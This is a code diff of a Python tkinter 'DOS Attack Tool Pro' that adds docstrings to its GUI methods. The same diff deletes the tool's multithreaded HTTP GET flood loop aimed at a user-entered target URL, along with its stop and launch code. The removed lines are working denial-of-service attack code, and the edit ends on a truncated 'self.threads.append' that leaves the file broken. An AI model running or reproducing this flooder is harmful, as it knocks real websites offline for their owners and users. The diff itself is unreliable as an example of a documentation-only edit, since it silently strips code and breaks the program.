@@ -10,6 +10,9 @@ from tkinter import messagebox
 
 class DosAttackToolGUI:
     def __init__(self):
+        """
+        Initialize the DosAttackToolGUI class, create the main window, and place input fields, output frame, and buttons.
+        """
         self.window = tk.Tk()
         self.window.title("DOS Attack Tool Pro")
         self.window.geometry("800x500")
@@ -39,6 +42,9 @@ class DosAttackToolGUI:
         self.create_button()
 
     def create_input_fields(self):
+        """
+        Create input fields for the target URL, number of threads, number of requests per thread, and a checkbox for verbose output.
+        """
         frame = tk.Frame(self.window)
         frame.pack(pady=20)
 
@@ -64,6 +70,9 @@ class DosAttackToolGUI:
         verbose_check.grid(row=3, columnspan=2, pady=(10, 0))
 
     def create_output_frame(self):
+        """
+        Create a frame for the output text widget.
+        """
         frame = tk.Frame(self.window)
         frame.pack()
 
@@ -74,6 +83,9 @@ class DosAttackToolGUI:
         self.output_text.pack()
 
     def create_button(self):
+        """
+        Create start and stop buttons.
+        """
         frame = tk.Frame(self.window)
         frame.pack(pady=(20, 0))
 
@@ -84,6 +96,9 @@ class DosAttackToolGUI:
         stop_button.pack(side="left")
 
     def start_attack(self):
+        """
+        Validate input, start the attack, and create threads to send requests.
+        """
         if self.is_attack_running:
             print("Error: Attack is already running!")
             return
@@ -102,57 +117,4 @@ class DosAttackToolGUI:
         for i in range(self.num_threads):
             thread = threading.Thread(target=self.send_requests, name=f"Thread-{i + 1}")
             thread.start()
-            self.threads.append(thread)
-
-    def stop_attack(self):
-        if not self.is_attack_running:
-            print("Error: Attack is not running!")
-            return
-
-        self.is_attack_running = False
-
-        for thread in self.threads:
-            thread.join()
-
-        print("Attack Finished: DOS attack finished!")
-
-    def send_requests(self):
-        session = requests.Session()
-        session.headers = {
-            'Connection': 'keep-alive',
-            'Content-Type': 'text/html',
-        }
-
-        while self.is_attack_running:
-            for _ in range(self.num_requests):
-                try:
-                    response = session.get(self.target_url)
-                    if self.verbose:
-                        self.output_text.config(state=tk.NORMAL)
-                        self.output_text.insert(tk.END,
-                                                f"Request sent | Thread: {threading.current_thread().name} | Status Code: {response.status_code}\n")
-                        self.output_text.see(tk.END)
-                        self.output_text.config(state=tk.DISABLED)
-
-                except requests.exceptions.RequestException as e:
-                    if self.verbose:
-                        self.output_text.config(state=tk.NORMAL)
-                        self.output_text.insert(tk.END, f"Error occurred: {e}\n")
-                        self.output_text.see(tk.END)
-                        self.output_text.config(state=tk.DISABLED)
-                    pass
-
-                time.sleep(0.01)
-
-        self.output_text.config(state=tk.NORMAL)
-        self.output_text.insert(tk.END, f"Thread {threading.current_thread().name} stopped\n")
-        self.output_text.see(tk.END)
-        self.output_text.config(state=tk.DISABLED)
-
-
-if __name__ == '__main__':
-    try:
-        dos_attack_tool = DosAttackToolGUI()
-        dos_attack_tool.window.mainloop()
-    except tk.TclError:
-        print("No GUI environment detected.")
+            self.threads.append
